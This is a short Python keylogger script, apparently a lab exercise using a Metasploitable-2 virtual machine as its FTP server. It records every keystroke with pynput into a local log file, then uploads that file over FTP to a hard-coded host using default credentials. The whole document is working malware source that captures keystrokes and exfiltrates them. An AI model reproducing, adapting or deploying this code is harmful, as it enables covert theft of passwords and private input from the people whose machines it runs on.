#-----------------------------------------------------------------------------------------

#   Keylogger
#   Saves log file LOCALLY as well as on a FTPSERVER
#   For a FTPSERVER we are using Metasploitable-2 in Vbox

#-------------------------------------------------------------------------------------------
from pynput.keyboard import Key, Listener
import ftplib
import logging

#logdir = "" Stores the log in the current dir
logdir = ""

#logging.basicConfig() this specifies the name of the log file and the format of saving the logs
logging.basicConfig(filename=(logdir+"klog-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")


#   pressing_key functions defines the key pressed
def pressing_key(key):
    try:
        logging.info(str(key))
    except AttributeError:
        print("A special key (0) has been pressed.".format(key))


#   releasing_key function is used to come out of the loop of keylogging
def releasing_key(key):
    if key == Key.esc:
        return False

print("\nStarted Listening...\n")


#using two function to work on a object listener
with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
    listener.join()


print("\nConnecting to the FTP and sending the data...")


sess = ftplib.FTP("192.168.0.103","msfadmin","msfadmin")
file = open("klog-res.txt","rb")
sess.storbinary("STOR klog-res.txt",file)
file.close()
sess.quit()



                    
                    
                    
                    
                    
